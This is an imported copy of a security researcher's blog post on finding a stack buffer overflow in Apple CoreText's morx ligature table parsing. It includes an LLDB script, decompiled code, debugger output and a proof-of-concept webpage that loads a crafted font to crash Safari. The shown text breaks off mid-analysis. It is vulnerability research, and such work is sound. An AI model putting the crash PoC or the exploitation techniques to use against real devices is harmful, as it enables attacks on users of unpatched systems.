---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-09-29_apple-coretext-an-unexpected-journey-to-learn-about-failure.md
original_filename: 2022-09-29_apple-coretext-an-unexpected-journey-to-learn-about-failure.md
title: Apple CoreText - An Unexpected Journey to Learn about Failure
category: documents
detected_topics:
- command-injection
- automation-abuse
- information-disclosure
- api-security
- supply-chain
tags:
- imported
- documents
- command-injection
- automation-abuse
- information-disclosure
- api-security
- supply-chain
language: en
raw_sha256: c1aee22d763ac16e2d35e3ff8eaabf1810792b7ddbf5f9de58d1077eb7a7071a
text_sha256: 3014d244ba78871d6665fd65d493e29cf3ccc06cd43c6df16b8587e145bfd25b
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: false
---

# Apple CoreText - An Unexpected Journey to Learn about Failure

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-09-29_apple-coretext-an-unexpected-journey-to-learn-about-failure.md
- Source Type: markdown
- Detected Topics: command-injection, automation-abuse, information-disclosure, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: False
- Raw SHA256: `c1aee22d763ac16e2d35e3ff8eaabf1810792b7ddbf5f9de58d1077eb7a7071a`
- Text SHA256: `3014d244ba78871d6665fd65d493e29cf3ccc06cd43c6df16b8587e145bfd25b`


## Content

---
title: "Apple CoreText - An Unexpected Journey to Learn about Failure"
page_title: "Apple CoreText - An Unexpected Journey to Learn about Failure | STAR Labs"
url: "https://starlabs.sg/blog/2022/09-apple-coretext-an-unexpected-journey-to-learn-about-failure/"
final_url: "https://starlabs.sg/blog/2022/09-apple-coretext-an-unexpected-journey-to-learn-about-failure/"
authors: ["Daniel Lim Wee Soong (@daniellimws)"]
programs: ["Apple"]
bugs: ["Memory corruption"]
publication_date: "2022-09-29"
added_date: "2022-09-30"
source: "pentester.land/writeups.json"
original_index: 2105
---

Research September 29, 2022 By Daniel Lim Wee Soong 71 min read

# Apple CoreText - An Unexpected Journey to Learn about Failure

Table of Contents

  * 1\. Attack Surface
  * 1 Oct 2021
  * 20 Oct 2021
  * 26 Oct 2021
  * 2\. Details of Vulnerability
  * 1 Nov 2021
  * 3 Nov 2021
  * 8 Nov 2021
  * Part 3a : Exploit-Crash
  * Step 0: Trigger the crash
  * LLDB setup for debugging the POC
  * How did the crash happen?
  * All the ideas don’t work, except one
  * Part 3b : Exploit-Control-Stack
  * Attempt 1 (fail): By making many nested HTML elements
  * Attempt 2 (success): Recursive JS function calls
  * Now add in the poc font
  * Part 3c : Exploit-OOB-Write
  * OOB Write Code Path
  * Attempt 1 (fail):
  * Attempt 2 (fail): DFG JIT
  * Attempt 3 (success): wasm
  * Final Notes
  * Part 3d : Exploit-vtable-overwrite
  * Some statistics
  * One heap per core
  * Holes in the heap
  * Memory layout of `tfont` and `glyphs`
  * `CTNativeGlyphStorage` structure
  * `TFont` structure
  * Disable the vtable call (failed)
  * Exploitation steps
  * Breaking at the right time
  * Some other ideas to explore
  * References

Late last year, I have focused my research on the CoreText framework for 2-3 months. In particular, the code related to the text shaping engine and the code responsible for parsing the AAT tables.

During this research, I found an OOB (Out-Of-Bounds) Write in the [`morx table`](https://developer.apple.com/fonts/TrueType-Reference-Manual/RM06/Chap6morx.html). This series of writeups is to document my whole process, from selecting this attack surface to finding the bug to writing an exploit for it in Safari. I hope this is helpful for anyone interested in starting researching in this area or who wants to help finish the exploit on Safari (because it’s not done yet) :D

There are many, many internal structs, and I have reversed those that are useful for this vulnerability and exploit.

I will try to be as detailed as possible in this set of notes, so I split them into parts:

  * Attack Surface
  * Vulnerability
  * Exploit

**Disclaimer:** This is not another success story/post. These were originally my notes while doing this research, and I got the help of my teammates Jacob and Frances to clean it up before we share it. This post is mainly about the various obstacles I faced and how I found ways to overcome them. So, there are a lot of “failed attempts” described in this post. Perhaps most of the content here won’t be relevant to what you do, but I hope you gain some inspiration from them for your own obstacles.

Before we begin, this [zip file](https://github.com/star-sg/Random-Scripts/raw/main/attachments/coretext-morx-oob-write-mini.zip) contains the files that I reference throughout this post.

## 1\. Attack Surface

_In this section, I share about how I came across this interesting component in the CoreText framework, and why I decided to explore deeper into it._

After 2 months of sadness because of my lack of results from the CoreGraphics/ImageIO research, Jacob recommended that I reproduce one of the bugs [Peter Nguyễn](https://twitter.com/peternguyen14) found in CoreText/libFontParser. It was an OOB read bug. It sounded like a good idea to me, so I did it and wrote a [writeup](https://starlabs.sg/blog/2021/09-analysis-of-cve-2021-1758/) on the process. Lucky for me, Apple didn’t fix the bug entirely back then, and there was another way of triggering the OOB read. I hinted at the bug in the writeup as well. I reported to Apple but they still haven’t updated us if it’s fixed or not since **16th September 2021**.

Moving on, I decided to try to bindiff the different versions of CoreText and see if I can find the patched bugs listed in the Apple Security Updates list. In particular, I tried to bindiff CoreText between macOS 11.4 vs 11.5 and tried to identify `CVE-2021-30789`. As there was no detailed description of the bug in the CVE, I had to look through all the pieces of code that have changed.

### 1 Oct 2021

Out of all the codes that had changed, my gut feel told me that the bug was likely in `CTFontShapeGlyphs` where an additional length check was added. Although the change here was an added length check, I could not tell what was wrong without the check. All the codes in there did not make any sense to me since many internal structures were used. So, I had to use LLDB to see what was happening there. I discovered that WebKit has calls to `CTFontShapeGlyphs`, so I happily renamed the function arguments based on what WebKit passes to it. I also attached LLDB to Safari, set a breakpoint to this function, and began my reversing efforts by clicking around in Google and Wikipedia. Fast forward, as I could not identify the bug here, there is a possibility there was no bug at all, or I didn’t understand enough.

Among the changes, I also realized that `TCombiningEngine::ResolveCombiningMarks` also has an added length check. Similarly, to find out what the length check was for, I continued reversing. To help with that, I also wrote a simple and slow command to collect code coverage in LLDB (`cov`). (You may refer to my [notes on LLDB scripting](https://nusgreyhats.org/posts/writeups/basic-lldb-scripting/)).
  
  
  def cmd_cov(debugger, command, result, _dict):
  # this is a global variable created to disable showing the context upon every `step` or `continue` command
  # because this command will step and continue through the program many times
  global CONFIG_NO_CTX
  
  # this command sets a breakpoint at the start of a function, and will keep stepping until the function returns
  # we can visit this function a specified number of times
  # e.g. the first 199 calls to are not interesting so we want to get the coverage of the 200th call to it
  args = command.split(' ')
  if len(args) < 1:
  print('cov <function_name> <times>')
  return
  
  CONFIG_NO_CTX = 1
  
  func_name = args[0]
  if len(args) == 2:
  times = int(args[1])
  else:
  times = 1
  
  rip = int(str(get_frame().reg["rip"].value), 16)
  
  # delete all breakpoints
  res = lldb.SBCommandReturnObject()
  lldb.debugger.GetCommandInterpreter().HandleCommand("bpda", res)
  
  # set a breakpoint at the start of the given function
  res = lldb.SBCommandReturnObject()
  lldb.debugger.GetCommandInterpreter().HandleCommand("b " + func_name, res)
  print(res)
  
  lldb.debugger.GetCommandInterpreter().HandleCommand("c", res)
  
  rip = int(str(get_frame().reg["rip"].value), 16)
  target_func = resolve_symbol_name(rip)
  print(target_func)
  
  cur_target = debugger.GetSelectedTarget()
  xinfo = resolve_mem_map(cur_target, rip)
  module_name = xinfo["module_name"]
  module_base = rip - xinfo["abs_offset"]
  print(module_name, hex(module_base))
  
  # we may want to skip the first x number of times visiting this function
  for i in range(times):
  with open(f"covs/cov{i}.txt", "w") as out:
  # stepping through the function until `ret`
  while True:
  get_process().selected_thread.StepInstruction(False)
  rip = int(str(get_frame().reg["rip"].value), 16)
  xinfo = resolve_mem_map(cur_target, rip)
  out.write(f"{xinfo['module_name']}+0x{xinfo['abs_offset']:x}\n")
  
  if target_func == resolve_symbol_name(rip) and get_mnemonic(rip) == 'ret':
  lldb.debugger.GetCommandInterpreter().HandleCommand("c", res)
  print(f"[+] Written to covs/cov{i}.txt")
  break
  
  
  CONFIG_NO_CTX = 0
  

This information was very useful to me, as I used this information to identify the functions and code paths that were reachable. I could then set breakpoints at these code locations that I know were being executed, and reverse engineer the variables and structures used.

During this process, I found that Tamil text will have more code coverage, so I created a blank website with some short Tamil text and continued reversing the internal structs to simplify things. This is an excruciating process, and it took me 1-2 weeks to slowly build an understanding of all the data structures involved. For example:

  * `TRunGlue`
  * `TLine`
  * `TShapingEngine`
  * `TKerningEngine`
  * `TCharStream`
  * `TUnicodeEncoder`
  * `TCombiningEngine`
  * `TGlyphEncoder`
  * `TGlyphStorage`

**FunFact:** I also learnt Tamil during this time :P thanks to my Indian friend [Akash](https://twitter.com/Enigmatrix2000)

After some time, I still could not see how there was a vulnerability without the newly added length check. I wanted to give up since I was not sure if there was a vulnerability in the first place. Anyways, I just continued reversing the code in this area, slowly building up an understanding of the structs and hoping to find any silly mistakes that Apple devs might make (and obviously, it wasn’t so easy). I did so for some time (maybe 1-2 weeks), and although I did manage to rename more fields of the structs, I didn’t have any clear goal, so I decided to stop.

While reversing, there were some interesting strings or names that caught my eye (which eventually was where I found the bug 1 month later):

  * `morx` (extended metamorphosis table)
  * `AAT` (which stands for Apple Advanced Typography)
  * `kerx` (extended kerning table)

During this time, I also read many articles to get inspiration. In particular, P0’s writeups on TTF fuzzing on Windows:

  * <https://github.com/googleprojectzero/BrokenType>
  * <https://googleprojectzero.blogspot.com/2016/06/a-year-of-windows-kernel-font-fuzzing-1_27.html>
  * <https://googleprojectzero.blogspot.com/2016/07/a-year-of-windows-kernel-font-fuzzing-2.html>
  * <https://googleprojectzero.blogspot.com/2017/04/notes-on-windows-uniscribe-fuzzing.html>
  * <https://j00ru.vexillium.org/talks/44con-reverse-engineering-and-exploiting-font-rasterizers/>

### 20 Oct 2021

At this point, I thought maybe I should try fuzzing instead. So I wrote a harness that loaded **a font** and **some text** , then called as many functions as possible from the `CTFont*` family (check out the harness folder for it). I chose a TTF file that is designed for Tamil text, and set the fuzzer to mutate a text file containing some Tamil sentences copied online. I only mutated the text file, and not the font file, because a mutator that is not structure-aware is probably not efficient at all. I tried AFL_Frida and Jackalope, but in the end, I felt that Jackalope was a lot nicer to use due to its stability.

The fuzzer is most likely not able to find any bugs, especially since the font file was not mutated at all, and indeed it didn’t. Still, anyway it generated good text test cases which gave us as much coverage as possible. The coverage loaded into Lighthouse on IDA helped a lot with my reversing process, as it indicated which code paths were taken.

While I left the fuzzer to run, I took my time to read about [Apple’s font engine](https://developer.apple.com/fonts/TrueType-Reference-Manual/RM02/Chap2.html) and all the [AAT stuff](https://developer.apple.com/fonts/TrueType-Reference-Manual/RM06/Chap6.html). There are SO MANY special table formats and so many tables that do different things.

During this time, I alternate between reading docs and reading code based on the coverage generated from fuzzing. I also sometimes go to Wikipedia on Safari, with LLDB attached, and just click around different pages in different languages and try to reach certain functions in CoreText. In particular, the name `morx` sounded very interesting to me, so I set breakpoints to see under what situations can I reach these functions, such as:

  * `TAATMorphTable::ShapeGlyphs(SyncState&, bool&, __CFString const*)`
  * `TAATMorphSubtableMorx::SetChain(MorxChain const*, void const*, void const*)`
  * `TAATMorphSubtableMorx::NextSubtable()`
  * `TAATMorphSubtableMorx::Process(TRunGlue&, CFRange)`
  * `TAATMorphSubtableMorx::InitLigatureState(TAATMorphSubtableMorx::MorxLigatureState&)`
  * `TAATMorphSubtableMorx::FetchInitialClass(TRunGlue&, CFRange, TRunGlue::TGlyph&, long&, TAATMorphSubtable::GlyphState&)`
  * `TAATMorphSubtableMorx::InitContextualState(TRunGlue&, TAATMorphSubtableMorx::MorxContextualState&)`
  * `TAATMorphSubtableMorx::DoContextualSubstitution(TRunGlue&, unsigned short, TRunGlue::TGlyph, char const*, MorphActionResultCode&)`

Not all text/glyphs will trigger the execution of morx-related code. I found that Lithuanian and Arabic text are the ones that will let CoreText enter these functions, so I added them to my fuzzing corpus, and left Jackalope to continue exploring and generating text with coverage that increases over time.

### 26 Oct 2021

Around this time, I have read most of the stuff in the Apple font documentation, namely about:

  * Font Engine
  * TrueType Font Program/Instruction Set
  * AAT Special Tables Formats
  * AAT Tables

I took a step back to think about which area I wanted to dive deep into. In the end, I was very attracted by the AAT tables for a couple of reasons:

  * AAT (Apple Advanced Typography) is only present in Apple devices, because of this, I think it is likely not many people would research this area.
  * Maybe because it’s not widely used, `fonttools` doesn’t support most of the AAT tables, so it is harder to fuzz well (without writing custom tools).
  * It actually is very rarely used. I scanned through a corpus of ttfs (I can’t remember which), and almost none of them have AAT tables (from memory, I can’t find so I cannot verify).
  * There are so many complex formats for AAT tables, so there might be some room for mistakes.

So, I decided to focus on the AAT tables. Due to the complexity of the table formats, I felt that it is better to manually review the code first, as it is hard to write a mutator that can well preserve the expected format. It is not too hard to identify AAT related functions in CoreText, because they all start with `TAAT`, followed by their table name, e.g.:

  * `TAATAnkrTable:...`
  * `TAATBslnEngine:...`
  * `TAATOpbdTable:...`
  * `TAATTrakTable:...`
  * `TAATMorphSubtableMorx:...` (except for `morx` that has a longer namespace)

In part 2, I write about how I found this vulnerability and share more information about it too.

AAT tables use many different table/subtable formats. Here’s the official documentation: <https://developer.apple.com/fonts/TrueType-Reference-Manual/RM06/Chap6Tables.html>

## 2\. Details of Vulnerability

_In this section, I share about the details of the vulnerability. It probably is the part that most people are interested in._

### 1 Nov 2021

Starting off with my code review, I chose some smaller tables to review first, namely the `trak` and `just` tables. I didn’t find any bugs in there, and tbh they really are quite simple, so there is not much room for error.

### 3 Nov 2021

I think it is better for me to understand text shaping engines better because I am looking at Apple’s text shaping engine right now, and I know nothing about how they work. Here are some very useful resources:

  * <https://harfbuzz.github.io/what-is-harfbuzz.html> (everything in this manual is good)
  * <https://docs.google.com/presentation/d/1x97pfbB1gbD53Yhz6-_yBUozQMVJ_5yMqqR_D-R7b7I/present?slide=id.p>

### 8 Nov 2021

I considered reading HarfBuzz’s code first because it is open source and should be doing about the same thing as CoreText. Then I decided to also find known bugs in HarfBuzz to see whether they exist in CoreText.

I stumbled upon this [issue](https://github.com/harfbuzz/harfbuzz/issues/1225), and decided to look at the [patch that fixed it](https://github.com/harfbuzz/harfbuzz/commit/4831e615d173be9c7e140be0fa9017e4d9e499af). In the end, it looks like something specific to HarfBuzz, so it is not very useful. The commit basically says:

> [morx] Fix memory access issue
> 
> If buffer was enlarged, info was being outdated.

I decided to look at how HarfBuzz processes the morx table, written in **src/hb-aat-layout-morx-table.hh**. Then I just saw this:
  
  
  template <>
  struct LigatureEntry<true>
  {
  enum Flags
  {
  SetComponent	= 0x8000,	/* Push this glyph onto the component stack for
  * eventual processing. */
  DontAdvance		= 0x4000,	/* Leave the glyph pointer at this glyph for the
  next iteration. */
  PerformAction	= 0x2000,	/* Use the ligActionIndex to process a ligature
  * group. */
  Reserved		= 0x1FFF,	/* These bits are reserved and should be set to 0. */
  };
  

And thought: ooh, what’s this _component stack_?

So I decided to read the documentation on the morx table one more round (it is so complex, I had to read 2-3 times to properly understand it). As I felt comfortable with the morx table format, I started to read the code in CoreText. It turns out it wasn’t hard to get started once I got familiar with the morx format. I focused on the code processing the **ligature subtable** (`TAATMorphSubtableMorx::DoLigatureSubtable`), as this was the part that has the “component stack” mentioned above.

**To avoid confusion with the _component stack_ , I will explicitly mention _program stack_ when referring to the stack frame of a function.**

Then I found a stack-based buffer overflow. Yay :D Finally found something 4 weeks before the internship ends.

It is not actually necessary to understand the whole morx table format to understand the vulnerability, but here’s the [official documentation](https://developer.apple.com/fonts/TrueType-Reference-Manual/RM06/Chap6morx.html).

For some basic understanding, within the morx table, there are a few subtables.

  * Rearrangement subtable
  * Contextual subtable
  * **Ligature subtable**
  * Noncontextual (“swash”) subtable
  * Insertion subtable

The **ligature subtable** is the one with a bug. It is responsible for telling the engine how to combine certain characters (or Unicode code points) to show a different glyph. For example, it can be configured so that `fi` will show a different glyph instead of 2 separate glyphs, `f` and `i`. Those that use the Fira Code font will be familiar with how certain character combinations will appear as a special glyph (e.g. `==`, `>=`, `->`).

To summarize, the 2 most relevant things are `LigatureEntry` and `LigatureAction`, which are a part of the **ligature subtable**. They are both 32-bit values, storing flags set on certain bit positions. This information could be found [in Apple’s documentation](https://web.archive.org/web/20220719051226/https://developer.apple.com/fonts/TrueType-Reference-Manual/RM06/Chap6morx.html#:~:text=The%20entry%20table%20for%20a%20ligature%20subtable%20has%20three%20UInt16s%20per%20entry%3A). In terms of bitmasks, these are the flags for `LigatureEntry` and `LigatureAction` (taken from [**harfbuzz/src/hb-aat-layout-morx-table.hh**](https://github.com/harfbuzz/harfbuzz/blob/f7f6d278bb166942c9a87fd7cefbd7fa294a0ba2/src/hb-aat-layout-morx-table.hh#L373)):
  
  
  struct LigatureEntry<true>
  {
  enum Flags
  {
  SetComponent	= 0x8000,	/* Push this glyph onto the component stack for
  * eventual processing. */
  DontAdvance		= 0x4000,	/* Leave the glyph pointer at this glyph for the
  next iteration. */
  PerformAction	= 0x2000,	/* Use the ligActionIndex to process a ligature
  * group. */
  Reserved		= 0x1FFF,	/* These bits are reserved and should be set to 0. */
  };
  ...
  
  
  
  enum LigActionFlags
  {
  LigActionLast	= 0x80000000,	/* This is the last action in the list. This also
  * implies storage. */
  LigActionStore	= 0x40000000,	/* Store the ligature at the current cumulated index
  * in the ligature table in place of the marked
  * (i.e. currently-popped) glyph. */
  LigActionOffset	= 0x3FFFFFFF,	/* A 30-bit value which is sign-extended to 32-bits
  * and added to the glyph ID, resulting in an index
  * into the component table. */
  };
  

There are many flags above that look confusing, especially when not knowing any other parts of the ligature subtable. But here is the rough idea, and the only thing we care about, for the sake of the vulnerability:

  1. The engine will go through a list of `LigatureEntry`s defined in the morx table, there can be as many as the font decides to have.

a. The MSB (`SetComponent` flag) can be set, so that the engine pushes a glyph onto the component stack.

**Push something onto a stack.**

b. The `PerformAction` flag can be set, so that the engine looks up the **ligature action table** and processes the `LigatureAction`s there, based on some starting index.

**Let the engine process`LigatureAction`s.**

  2. When the engine reaches a `LigatureEntry` that has `PerformAction` flag set, it will go through a list of `LigatureAction`s.

a. The `LigActionStore` flag can be set, to update an entry in the ligature table. I won’t discuss the details, as it wasn’t particularly important to me at this stage.

**The important thing is, in CoreText’s implementation, something will be pushed onto the program stack after this is done.**

b. After processing one `LigatureAction`, the engine increments the index of the **ligature action table** and processes the next `LigatureAction`.

c. The `LigActionLast` flag serves to inform the engine to stop processing further `LigatureAction`s.

**Basically, the engine keeps going down the table, until it sees a`LigatureAction` with `LigActionLast` flag set.**

And here’s the rough code of how CoreText performs the steps above. First, there’s a `MorxLigatureState` struct to keep some info:
  
  
  struct TGlyph  // for now, just know that this struct takes up 16 bytes
  {
  void* trunglue;
  int64_t location;
  }
  
  struct MorxLigatureState
  {
  TGlyph tglyphs[0x80];  // this is the component stack
  int stack_top;  // index of the top of the stack
  int max_stack_size;  // the maximum stack size reached (used when popping from the stack)
  ...
  }
  

In `TAATMorphSubtableMorx::DoLigatureSubtable`, the engine starts iterating through the `LigatureEntry`s and processes them one by one.
  
  
  TAATMorphSubtableMorx::DoLigatureSubtable(..., MorxLigatureState state, ...)
  {
  ...
  
  if (flags & 0x8000)  // SetComponent flag is set
  {
  // update stack_top and max_stack_size
  state->stack_top++;
  stack_top = state->stack_top;
  
  // set stack_top back to 0 if it reaches 0x80, i.e. no overflow/out-of-bounds access here
  // thus, this is not the bug
  if ( stack_top > 0x7E )  // wrap around
  state->stack_top = 0;
  else
  state->max_stack_size = max(state->stack_top, state->max_stack_size);
  
  // push a TGlyph into state->tglyphs
  state->tglyphs[stack_top].trunglue = trunglue;
  state->tglyphs[stack_top].location = location;
  }
  
  if (flags & 0x2000)  // PerformAction flag is set
  {
  TAATMorphSubtableMorx::DoLigatureAction(..., state, ...);
  ...
  }
  }
  

As mention earlier, a `LigatureEntry` could have the `PerformAction` flag set. `TAATMorphSubtableMorx::DoLigatureAction` is called to process this `LigatureAction`. This function is where the bug lies, in particular through a write to the `tglyphs_storage` array without any bounds check. Recall earlier I mentioned that when the `LigActionStore` flag is set, something is pushed onto the program stack.
  
  
  TAATMorphSubtableMorx::DoLigatureAction(..., MorxLigatureState state, ...)
  {
  ...
  TGlyph tglyphs_storage[0x80];
  // end of stack frame (of course there's canary here)
  
  ...
  
  while(1)
  {
  // load ligature action from ligature action subtable
  p_ligature_action_entry = &lig_action_table[lig_action_index];
  ...
  // byteswap because font stores values in big endian
  // the -1 doesnt matter too much
  lig_action_entry = _byteswap_ulong(*(p_ligature_action_entry - 1));
  
  // load a TGlyph from state->tglyphs
  stack_top = state->stack_top;
  trunglue = state->tglyphs[stack_top].trunglue;
  location = state->tglyphs[stack_top].location;
  
  if (lig_action_entry >= 0x40000000)  // either Store or Last flag is set
  {
  // does some stuff to update the glyphs that will be shown to the user
  ...
  
  // then it appends the TGlyph to the local tglyphs array
  // no bounds check lol
  // remember tglyphs only has space for 0x80 elements, and storage_index is not bounded
  tglyphs_storage[storage_index].trunglue = trunglue;
  tglyphs_storage[storage_index].location = location;
  storage_index++;
  }
  
  ...
  
  // update state->stack_top
  state->stack_top--;
  if ( state->stack_top < 0 )  // wrap around to other end of stack
  state->stack_top = *state->max_stack_size;
  
  if (...)  // Last flag is set
  {
  // does some cleaning up
  ...
  
  break;
  }
  }
  }
  

To sum up what can happen in the code above:

  1. There can be a `LigatureEntry` that has `PerformAction` flag set, i.e. `DoLigatureAction` is called.
  2. There can be more than `0x80` `LigatureAction`s in a row. None of them has the `Last` flag set, and all of them have the `Store` flag set.
  3. GG. Can overflow the stack as much as wanted.
  4. However, note that `tglyphs_storage` is at the end of the stack, so overflowing it immediately overwrites the stack canary followed by the return address.

There is a big limitation:

  1. As seen above, we write a `TGlyph` to the stack, which consists of 2 `QWORD`s. One is a pointer, and another is a value (which is user-controllable but within a limited small range).
  2. After overflowing the `tglyphs_storage` array, the **stack canary** and **return address** are overwritten with the pointer and value respectively, and the program will crash once the `while` loop is done.

From the description above, it seems like this bug is not exploitable. There is no chance of gaining code execution, i.e. controlling `RIP` through overwriting the return address on the stack. However, the program ONLY crashes if the while loop is exited. Could it be possible to do more damage while staying in that loop? Yes :)

It is not so straightforward to exploit this, but I managed to use this bug on Safari, turning it into a heap relative write, then overwriting an object’s vtable pointer to control RIP. It is not reliable but could possibly be exploited by someone more skillful.

Also, the exploit is not usable yet, because it:

  * Needs leak of library addresses - for ROP
  * Needs leak of heap addresses/or somewhere else - to know the address of fake vtable
  * Needs to groom the heap because half the time, the objects don’t appear at the expected offset

* * *

To help with testing, I forked P0’s [BrokenType](https://github.com/googleprojectzero/BrokenType) repo which already has a SFNT parser, so I am left with just writing the morx table parser. With this, I wrote some simple tools in the **ttf-reader** folder. It has a CMake setup so just do the standard CMake build process.
  
  
  mkdir build && cd build
  cmake ..
  make
  

There are 5 programs:

  * `emorx <input font> <output font>` \- Used to expand the morx table by filling it with `\x01` at the end (not `\x00` because C++ strings probably just truncate the null bytes and don’t write them to the output file). This expansion is done so that I can monkey-patch it with ligature actions later.
  * `filterer <folder with fonts> <table name>` \- Used to filter font files that have a specified table (e.g. to filter for font files with a morx table from a corpus).
  * `repack <input font> <output font>` \- Loads the tables in a font file then save them back. I don’t remember why I made it. Probably to fix some checksums in the tables.
  * `rmorx <input font>` \- Dumps information in the morx table.
  * `statser <folder with fonts>` \- Prints out the total count of each font table found in the font files.

The morx format is quite complex, and I didn’t want to spend time writing code that generates the morx table, so I just monkey-patched the bytes in a hex editor.

## Part 3a : Exploit-Crash

_In this section, I dive deeper into the various parts of the morx table, satisfying some constraints to craft a valid font file that will cause a crash._

I am glad that you have made it so far, let’s do a recap:

  1. The bug gives a buffer overflow on the stack.
  2. We can overflow the stack with 2 `QWORD`s during one iteration of the `while` loop. One is a pointer, and the other is a user-controllable value within a limited range.
  3. Since the stack canary and return address will be overwritten, the program will crash once the `while` loop is done.

In other words, we need to find a way to control `RIP` before ending the `while` loop. At least one good news is we can make the `while` loop run for as long as we want because it depends on the number of `LigatureAction`s without the `Last` flag set.

### Step 0: Trigger the crash

I made a POC webpage that loads a POC font, which should crash Safari when loaded. The POC will use a patched version of the GeezaPro-Regular.ttf font.
  
  
  <!DOCTYPE html>
  <html lang="ar" dir="rtl">
  
  <head>
  <meta charset="UTF-8" />
  </head>
  
  <body>
  <canvas id="canvas" height="500px" width="500px"></canvas>
  <script>
  // https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=474948
  function draw() {
  var ctx = canvas.getContext('2d');
  ctx.font = '24px GeezaPro';
  ctx.fillText('من ويكيبيديا، الموسوعة الحرة', 400, 200);
  }
  
  function main() {
  const pocFontFace = new FontFace("GeezaPro", "url(poc.ttf)");
  
  var canvas = document.getElementById('canvas')
  canvas.setAttribute("style", "font-family: GeezaPro; -webkit-font-smoothing: none;")
  
  pocFontFace.load().then(function (pocFontFaceLoaded) {
  document.fonts.add(pocFontFaceLoaded)
  document.fonts.ready.then(function () {
  draw()
  })
  })
  }
  
  main()
  </script>
  </body>
  
  </html>
  

The first question is, which part of the font should be patched to trigger the bug? But before answering that, we need to take a look into the morx table. I wrote a morx table parser (`ttf-reader/bin/rmorx`) to print the contents of the morx table. Here’s the structure:
  
  
  Morx Table Header
  =================
  | Version: 2
  | Number of chains: 1
  
  [[ Morx Chain ]]
  Morx Chain Header
  =================
  | Default Flags: 247
  | Chain Length: 13102
  | Number of Feature Subtable Entries: 18
  | Number of Subtables: 9
  
  Morx Chain Feature Table
  ========================
  ...
  
  Morx Chain Subtables
  ====================
  // Ligature Subtable
  ...
  // Insertion Subtable (Parser Not Implemented)
  ...
  // Contextual Subtable (Parser Not Implemented)
  ...
  // Contextual Subtable (Parser Not Implemented)
  ...
  // Ligature Subtable
  ...
  // Ligature Subtable
  ...
  // Ligature Subtable
  ...
  // Swash Subtable (Parser Not Implemented)
  ...
  // Swash Subtable (Parser Not Implemented)
  

Here, we see that there are **9** subtables, **4** of which are the **ligature subtable** that we are interested in. The contents of one of them are as follows:
  
  
  // Ligature Subtable
  ------------------------
  | Metamorphosis Subtable Header
  ===============================
  | Length: 552
  | Coverage: 40000002
  | Flags: 40
  ===============================
  | Ligature Subtable Header
  ==========================
  | Number of classes: 11
  | Class lookup table offset: 28
  | State array offset: 72
  | Entry table offset: 272
  | Ligature actions offset: 412
  | Components offset: 468
  | Ligature list offset: 516
  ==========================
  | Class Table
  | (idw to implement)
  =====================
  | State Array
  | (idw to implement)
  =====================
  | Entry Table
  | (idw to implement)
  =====================
  | Ligature Actions
  |--
  | 3ffffc8b
  | Last: 0
  | Store: 0
  | Offset: fffffc8b
  |--
  | bffffc91
  | Last: 1
  | Store: 0
  | Offset: fffffc91
  |--
  =====================
  | Components
  | (idw to implement)
  =====================
  | Ligature List
  | (idw to implement)
  =====================
  --
  

It is clearer now that we should modify the **ligature actions** table of **1** of the **4** **ligature subtables** , but we are unsure which one. We need to find out which subtable is accessed when drawing the text in the poc webpage. We can’t just modify any random subtable, as the morx feature table determines which subtable is used, so we need to patch the correct one for it to take effect. Of course, understanding the feature table is not too hard but quite troublesome (don’t worry about the feature table, it’s not very important). So I just set a breakpoint at the following line inside `TAATMorphSubtableMorx::DoLigatureAction<TRunGlue::TGlyph>`, which retrieves the address of where the contents of the **ligature actions** table are stored.
  
  
  lig_action_table = ((char *)ligature_subtable_start + _byteswap_ulong(ligature_subtable_start[7]) + 12);
  
  
  
  (lldbinit) mbp CoreText 00007FFF219849FE
  Done
  
  
  
  (lldbinit) c
  Process 87339 resuming
  -----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000000012455C3EA  RBX: 0x0000000000000003  RBP: 0x00007FFEE271AA80  RSP: 0x00007FFEE271A060  o d I t S z a P C
  RDI: 0x00007FFEE271AA20  RSI: 0xAAAAAAAAAAAAAAAA  RDX: 0x0000000026020000  RCX: 0x000000012455C5E8
  RIP: 0x00007FFF21AB99FE  R8 : 0x00007FFEE271B3E0  R9 : 0x0000000000000006  R10: 0x000000012455C48A
  R11: 0x0000000000000012  R12: 0x00007FFEE271B3A0  R13: 0x00007FFEE271B830  R14: 0x0000000000000007
  R15: 0x000000000000A000
  CS : 002B  GS : 0000  FS : 0000
  -----------------------------------------------------------------------------------------------------------------------[code]
  bool TAATMorphSubtableMorx::DoLigatureAction<TRunGlue::TGlyphInSingleRun>(TRunGlue&, unsigned short, TAATMorphSubtableMorx::MorxLigatureState*, MorphActionResultCode&) @ /System/Library/Frameworks/CoreText.framework/Versions/A/CoreText:
  ->  0x7fff21ab99fe (0x7fff219849fe): 0f ca  bswap  edx
  0x7fff21ab9a00 (0x7fff21984a00): 48 8d 54 10 0c  lea  rdx, [rax + rdx + 0xc]
  0x7fff21ab9a05 (0x7fff21984a05): 48 89 95 20 f6 ff ff  mov  qword ptr [rbp - 0x9e0], rdx
  0x7fff21ab9a0c (0x7fff21984a0c): 8b 50 24  mov  edx, dword ptr [rax + 0x24]
  0x7fff21ab9a0f (0x7fff21984a0f): 0f ca  bswap  edx
  0x7fff21ab9a11 (0x7fff21984a11): 48 8d 44 10 0c  lea  rax, [rax + rdx + 0xc]
  0x7fff21ab9a16 (0x7fff21984a16): 48 89 85 48 f6 ff ff  mov  qword ptr [rbp - 0x9b8], rax
  0x7fff21ab9a1d (0x7fff21984a1d): 41 0f b7 c6  movzx  eax, r14w
  -----------------------------------------------------------------------------------------------------------------------------
  
  Process 87339 stopped
  * thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 10.1
  frame #0: 0x00007fff21ab99fe CoreText`bool TAATMorphSubtableMorx::DoLigatureAction<TRunGlue::TGlyphInSingleRun>(TRunGlue&, unsigned short, TAATMorphSubtableMorx::MorxLigatureState*, MorphActionResultCode&) + 130
  Target 0: (com.apple.WebKit.WebContent) stopped.
  
  
  
  (lldbinit) x/3wx $rcx
  0x12455c5e8: 0x9dfeff3f 0xabfeff3f 0xadfeffbf
  

If read as big-endian, these 3 values at the location pointed to by `rcx` exactly correspond to the 3rd ligature subtable (6th overall subtable).
  
  
  | Ligature Actions
  |--
  | 3ffffe9d
  | Last: 0
  | Store: 0
  | Offset: fffffe9d
  |--
  | 3ffffeab
  | Last: 0
